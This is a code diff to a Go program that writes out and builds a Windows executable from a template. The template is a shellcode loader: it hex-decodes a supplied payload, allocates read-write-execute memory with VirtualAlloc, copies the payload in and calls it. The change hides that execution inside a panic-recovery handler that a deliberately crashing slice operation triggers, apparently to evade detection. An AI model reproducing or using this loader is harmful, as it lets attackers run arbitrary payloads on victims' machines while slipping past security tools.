@@ -7,6 +7,7 @@ import (
 	"time"
 )
 
+//OutExeFile 自动生产exe
 func OutExeFile(s string) {
 	var temp = `
 package main
@@ -18,21 +19,26 @@ import (
 )
 
 func main() {
-   shellCode, _ := hex.DecodeString("` + s + `")
-	VirtualAlloc := syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc")
-	RtlCopyMemory := syscall.MustLoadDLL("ntdll.dll").MustFindProc("RtlCopyMemory")
-	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellCode)), 0x1000|0x2000, 0x40)
-	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellCode[0])), uintptr(len(shellCode)))
-	syscall.Syscall(addr, 0, 0, 0, 0)
-}` //go模板
-	name, err := GetRand()
-	if err != nil {
-		name = "ZheTian"
-	}
+	defer func() {
+		if err := recover(); err != nil {
+			shellCode, _ := hex.DecodeString("` + s + `")
+			VirtualAlloc := syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc")
+			RtlCopyMemory := syscall.MustLoadDLL("ntdll.dll").MustFindProc("RtlCopyMemory")
+			addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellCode)), 0x1000|0x2000, 0x40)
+			_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellCode[0])), uintptr(len(shellCode)))
+			syscall.SyscallN(addr, 0, 0, 0, 0)
+		}
+	}()
+	var count []int
+	count = append(count[:1], count[2:]...)
+
+}`
+	name := GetRand()
+
 	uHome, _ := os.UserHomeDir()
 	_, exist := os.Stat(uHome + "\\tmp")
 	if os.IsNotExist(exist) {
-		err = os.Mkdir(uHome+"\\tmp", os.ModePerm)
+		err := os.Mkdir(uHome+"\\tmp", os.ModePerm)
 		if err != nil {
 			fmt.Println("Temporary folder creation failed.")
 			os.Exit(-1)
@@ -44,7 +50,7 @@ func main() {
 		fmt.Println("Failed to build source file.")
 		os.Exit(-1)
 	}
-	_, err = f.WriteString(temp)
+	_, err := f.WriteString(temp)
 	if err != nil {
 		fmt.Println("Code writing to file failed.")
 		os.Exit(-1)
